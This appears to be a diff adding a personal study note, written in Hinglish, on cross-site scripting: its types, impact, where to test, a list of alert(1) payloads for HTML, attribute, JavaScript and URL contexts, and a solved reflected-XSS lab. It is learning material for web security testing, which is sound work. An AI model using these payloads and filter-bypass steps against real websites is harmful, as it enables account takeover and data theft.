@@ -1,0 +1,357 @@
+XSS Kya Hota Hai?
+
+Cross-Site Scripting (XSS) ek web vulnerability hai jisme attacker website ke andar apna JavaScript code run karwa sakta hai.
+
+Normally browser website ko trust karta hai.
+
+Agar website user input ko properly sanitize nahi karti to attacker ka JavaScript code victim ke browser me execute ho sakta hai.
+
+Simple words me:
+
+Attacker → Input bhejta hai
+Website → Input ko page par show karti hai
+Browser → Input ko code samajh kar run kar deta hai
+XSS Ka Real Goal
+
+Bahut log sochte hain:
+
+alert(1)
+
+hi XSS hai.
+
+Galat.
+
+alert(1) sirf proof of concept hai.
+
+Real attacker kar sakta hai:
+
+Account takeover
+Admin takeover
+User actions perform
+Sensitive data read
+Keylogging
+Internal API calls
+CSRF protection bypass in some cases
+Same Origin Policy (SOP)
+
+Browser ki security policy.
+
+Example:
+
+google.com
+facebook.com
+amazon.com
+
+Google ki JavaScript Facebook ki cookies nahi padh sakti.
+
+Ye SOP ki wajah se hota hai.
+
+Lekin agar Facebook me XSS mil jaye:
+
+<script>
+evil_code
+</script>
+
+To browser sochega:
+
+Ye Facebook ka hi code hai
+
+Aur attacker Facebook user ke behalf par kaam kar sakta hai.
+
+XSS Ka Flow
+Normal User
+
+Input:
+
+Bhavesh
+
+Output:
+
+<p>Bhavesh</p>
+
+Safe.
+
+Attacker
+
+Input:
+
+<script>alert(1)</script>
+
+Output:
+
+<p><script>alert(1)</script></p>
+
+Browser:
+
+alert(1)
+
+Execute.
+
+XSS mil gaya.
+
+XSS Ke 3 Main Types
+1. Reflected XSS
+
+Payload request me aata hai.
+
+Response me reflect hota hai.
+
+Example:
+
+Request:
+
+/search?q=test
+
+Response:
+
+You searched for test
+
+Payload:
+
+<script>alert(1)</script>
+
+Request:
+
+/search?q=<script>alert(1)</script>
+
+Response:
+
+You searched for <script>alert(1)</script>
+
+Browser execute karega.
+
+Important
+
+Payload database me save nahi hota.
+
+Har victim ko malicious URL visit karna padta hai.
+
+2. Stored XSS
+
+Payload database me save ho jata hai.
+
+Comment:
+
+<script>alert(1)</script>
+
+Database:
+
+Saved
+
+Ab jo bhi page kholega:
+
+<script>alert(1)</script>
+
+run ho jayega.
+
+Dangerous Because
+Admin bhi trigger kar sakta hai
+Har user trigger kar sakta hai
+Persistent hota hai
+3. DOM XSS
+
+Server vulnerable nahi hota.
+
+Browser-side JavaScript vulnerable hoti hai.
+
+Example:
+
+document.write(location.search);
+
+URL:
+
+?name=<script>alert(1)</script>
+
+JavaScript khud execute karwa deti hai.
+
+XSS Impact
+Cookie Theft
+document.cookie
+
+Agar HttpOnly nahi hai to cookie mil sakti hai.
+
+Account Actions
+fetch('/change-email')
+
+Victim ke behalf par request.
+
+Password Change
+fetch('/change-password')
+Admin Takeover
+
+Admin XSS trigger kare.
+
+Attacker admin ke account se kaam kar sakta hai.
+
+Keylogger
+document.addEventListener()
+
+User kya type kar raha hai capture.
+
+XSS Hunt Karne Ki Jagah
+
+Har jagah jahan input display hota hai:
+
+Search box
+Comment section
+Feedback form
+Contact form
+Username
+Bio
+Chat
+Error message
+URL parameter
+Common Payloads
+
+Basic:
+
+<script>alert(1)</script>
+
+Image Event:
+
+<img src=x onerror=alert(1)>
+
+SVG:
+
+Body Event:
+
+<body onload=alert(1)>
+XSS Testing Methodology
+
+Step 1
+
+Input:
+
+test123
+
+Dekho reflect ho raha hai ya nahi.
+
+Step 2
+
+Input:
+
+<h1>test123</h1>
+
+HTML render ho raha hai ya escape?
+
+Step 3
+
+Input:
+
+<script>alert(1)</script>
+
+Execute ho raha hai?
+
+Step 4
+
+Agar block ho jaye:
+
+<img src=x onerror=alert(1)>
+
+Try karo.
+
+Step 5
+
+Source Code Check
+
+Ctrl + U
+
+Ya Burp Response.
+
+Dekho input kis context me aa raha hai.
+
+Contexts Samajhna Bahut Important Hai
+HTML Context
+
+Example:
+
+<p>INPUT_HERE</p>
+
+Payload:
+
+<script>alert(1)</script>
+Attribute Context
+
+Example:
+
+<input value="INPUT_HERE">
+
+Payload:
+
+" onmouseover="alert(1)
+JavaScript Context
+
+Example:
+
+<script>
+var name="INPUT_HERE";
+</script>
+
+Payload:
+
+";alert(1);//
+URL Context
+
+Example:
+
+<a href="INPUT_HERE">
+
+Payload:
+
+javascript:alert(1)
+Lab Solved Today
+Lab Name
+
+Reflected XSS into HTML Context with Nothing Encoded
+
+Goal
+
+Search box me JavaScript execute karna.
+
+Payload
+<script>alert(1)</script>
+Steps
+
+Search Box:
+
+<script>alert(1)</script>
+
+Search Click.
+
+Response
+
+Website:
+
+You searched for <script>alert(1)</script>
+Browser
+alert(1)
+
+execute.
+
+Result
+
+Lab Solved ✅
+
+Important Learning
+1
+
+User input kabhi trust nahi karna chahiye.
+
+2
+
+Reflection + No Encoding = Easy Reflected XSS
+
+3
+
+alert(1) vulnerability nahi hai.
+
+Ye sirf proof hai ki arbitrary JavaScript execute ho sakta hai.
+
+4
+
+Real impact:
+
+Account Takeover
+Admin Takeover
+Sensitive Data Access
+Unauthorized Actions
